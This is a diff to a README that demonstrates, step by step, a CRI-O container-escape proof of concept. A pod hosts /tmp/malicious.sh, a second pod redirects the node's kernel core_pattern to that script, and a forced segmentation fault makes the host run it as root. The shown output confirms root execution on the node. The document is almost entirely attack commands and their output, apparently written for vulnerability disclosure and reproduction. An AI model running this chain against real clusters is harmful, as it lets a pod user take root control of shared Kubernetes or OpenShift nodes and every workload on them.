@@ -24,19 +24,23 @@ A flaw was found in CRI-O in the way it set kernel options for a pod. This issue
 
 # Startup Pod to Host Malicious Executable
 ```
-oc create -f ./malicious-script-host.yaml
+$ oc create -f ./malicious-script-host.yaml
+
+pod/malicious-script-host created
 ```
-`pod/malicious-script-host created`
+
 
 # Determine Root Path From Host Mount Namespace
 #### This is the path to the root of the container from the perspective of the kernel.
 ```
-oc exec malicious-script-host -- mount | grep overlay | awk -F, '{ print $6 }'
+$ oc exec malicious-script-host -- mount | grep overlay | awk -F, '{ print $6 }'
+
+upperdir=/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e/diff
 ```
-`upperdir=/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e/diff`
+
 # Copy contents of malicious.sh
 ```
-oc exec malicious-script-host -- /bin/bash -c "cat <<EOF > /tmp/malicious.sh
+$ oc exec malicious-script-host -- /bin/bash -c "cat <<EOF > /tmp/malicious.sh
 apiVersion: v1
 kind: Pod
 metadata:
@@ -50,73 +54,76 @@ EOF"
 ```
 # Modify script permissions and verify
 ```
-oc exec malicious-script-host -- /bin/bash -c 'chmod 755 /tmp/malicious.sh && ls -al /tmp/malicious.sh'
+$ oc exec malicious-script-host -- /bin/bash -c 'chmod 755 /tmp/malicious.sh && ls -al /tmp/malicious.sh'
+
+-rwxr-xr-x. 1 root root 197 Mar 17 19:22 /tmp/malicious.sh
 ```
-`-rwxr-xr-x. 1 root root 197 Mar 17 19:22 /tmp/malicious.sh`
+
 
 # Use Second Pod to Point Core Pattern to Malicious Script
 ### NOTE: You must ensure this pod runs on the same node as the malicious script pod. 
 
 ```
-oc create -f ./sysctl-set.yaml
-```
-`pod/sysctl-set created`
-```
-oc get pods
+$ oc create -f ./sysctl-set.yaml
+
+pod/sysctl-set created
 ```
 ```
+$ oc get pods
+
 NAME                    READY   STATUS              RESTARTS   AGE
 malicious-script-host   1/1     Running             0          14m
 sysctl-set              0/1     ContainerCreating   0          68s
 ```
 ### Whether or not the sysctl-set pod starts, it will successfully update the node-wide core_pattern to point into our malicious-script-host container. 
 ```
-oc exec malicious-script-host -- /bin/bash -c "cat /proc/sys/kernel/core_pattern"
+$ oc exec malicious-script-host -- /bin/bash -c "cat /proc/sys/kernel/core_pattern"
+
+|/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e6/diff/tmp/malicious.sh #
 ```
-`|/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e6/diff/tmp/malicious.sh #`
 
 # First enable core dumps:
 ```
-oc exec malicious-script-host -- /bin/bash -c "ulimit -c unlimited && ulimit -c"
+$ oc exec malicious-script-host -- /bin/bash -c "ulimit -c unlimited && ulimit -c"
+
+unlimited
 ```
-`unlimited`
 
 #### Note for ubi8 image ps will need to be installed via
 ```
-oc exec malicious-script-host -- /bin/bash -c "yum install procps-ng -y && ps --version"
-```
-```
+$ oc exec malicious-script-host -- /bin/bash -c "yum install procps-ng -y && ps --version"
+
 Installed:
   procps-ng-3.3.15-6.el8.x86_64
 ps from procps-ng 3.3.15
 ```
 # Now trigger the core dump:
 ```
-oc exec -it malicious-script-host -- /bin/bash
+$ oc exec -it malicious-script-host -- /bin/bash
+
+$ tail -f /dev/null &
 ```
 ```
-tail -f /dev/null &
-```
-```
-ps
-```
-```
+$ ps
+
 PID   USER     TIME  COMMAND
     1 root      0:00 tail -f /dev/null
    34 root      0:00 /bin/bash
    42 root      0:00 tail -f /dev/null
    43 root      0:00 ps
 ```
+
 ```
-kill -SIGSEGV 42`
+$ kill -SIGSEGV 42
+
+[1]+  Segmentation fault (core dumped) tail -f /dev/null
 ```
-`[1]+  Segmentation fault (core dumped) tail -f /dev/null`
+
 # Verify Malicious Script Ran :boom: :beer:
 
 ```
-oc exec malicious-script-host -- /bin/bash -c 'cat /output'
-```
-```
+$ oc exec malicious-script-host -- /bin/bash -c 'cat /output'
+
 Wed Feb 23 14:20:07 UTC 2022
 root
 ocp-cluster
